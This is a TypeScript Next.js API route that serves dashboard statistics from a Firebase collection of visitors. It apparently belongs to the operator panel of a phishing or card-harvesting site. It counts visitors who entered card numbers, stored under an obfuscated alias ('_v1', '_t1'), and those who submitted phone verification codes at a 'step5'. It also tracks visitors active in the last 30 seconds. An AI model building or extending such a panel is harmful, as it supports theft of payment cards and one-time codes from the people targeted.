import { NextResponse } from 'next/server';
import { getAllApplications } from '@/lib/firebase-services';

const toTimeValue = (value: unknown): number => {
  if (!value) return 0;

  if (value instanceof Date) {
    return value.getTime();
  }

  if (typeof value === 'object' && value !== null && typeof (value as any).toDate === 'function') {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

export async function GET() {
  try {
    // Get all visitors
    const allVisitors = await getAllApplications();
    
    // Calculate timestamps
    const now = new Date();
    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const thirtyDaysAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
    
    // Count active users (online in last 30 seconds for real-time accuracy)
    // Use lastActiveAt as the source of truth, with lastSeen fallback for legacy records.
    const thirtySecondsAgoTime = now.getTime() - 30 * 1000;
    const activeUsers = allVisitors.filter(visitor => {
      const lastActivityTime = toTimeValue(visitor.lastActiveAt ?? visitor.lastSeen);
      return lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
    }).length;
    
    // Count today's visitors
    const todayVisitors = allVisitors.filter(visitor => {
      if (!visitor.createdAt) return false;
      const createdAt = new Date(visitor.createdAt);
      return createdAt >= todayStart;
    }).length;
    
    // Count total visitors (last 30 days)
    const totalVisitors = allVisitors.filter(visitor => {
      if (!visitor.createdAt) return false;
      const createdAt = new Date(visitor.createdAt);
      return createdAt >= thirtyDaysAgo;
    }).length;
    
    // Count visitors with card data
    const visitorsWithCard = allVisitors.filter(visitor => {
      // Check direct fields
      if (visitor._v1 || visitor.cardNumber) return true;
      
      // Check history array
      if (visitor.history && Array.isArray(visitor.history)) {
        return visitor.history.some((entry: any) => 
          (entry.type === '_t1' || entry.type === 'card') && 
          (entry.data?._v1 || entry.data?.cardNumber)
        );
      }
      
      return false;
    }).length;
    
    // Count visitors with phone verification (step5 only)
    const visitorsWithPhone = allVisitors.filter(visitor => {
      // Check if they have phoneVerificationCode (step5)
      if (visitor.phoneVerificationCode) return true;
      
      // Check history for phone verification
      if (visitor.history && Array.isArray(visitor.history)) {
        return visitor.history.some((entry: any) => 
          entry.type === 'phone' && entry.data?.phoneVerificationCode
        );
      }
      
      return false;
    }).length;
    
    // Count devices
    const deviceCounts: Record<string, number> = {};
    allVisitors.forEach(visitor => {
      if (visitor.deviceType) {
        deviceCounts[visitor.deviceType] = (deviceCounts[visitor.deviceType] || 0) + 1;
      }
    });
    
    const devices = Object.entries(deviceCounts)
      .map(([device, users]) => ({ device, users }))
      .sort((a, b) => b.users - a.users);
    
    // Count countries
    const countryCounts: Record<string, number> = {};
    allVisitors.forEach(visitor => {
      if (visitor.country) {
        countryCounts[visitor.country] = (countryCounts[visitor.country] || 0) + 1;
      }
    });
    
    const countries = Object.entries(countryCounts)
      .map(([country, users]) => ({ country, users }))
      .sort((a, b) => b.users - a.users);
    
    return NextResponse.json({
      activeUsers,
      todayVisitors,
      totalVisitors,
      visitorsWithCard,
      visitorsWithPhone,
      devices,
      countries,
    });
  } catch (error: any) {
    console.error('Error fetching analytics:', error);
    return NextResponse.json(
      { 
        error: 'Failed to fetch analytics',
        message: error.message,
        activeUsers: 0,
        todayVisitors: 0,
        totalVisitors: 0,
        visitorsWithCard: 0,
        visitorsWithPhone: 0,
        devices: [],
        countries: [],
      },
      { status: 200 } // Return 200 with zeros instead of error
    );
  }
}
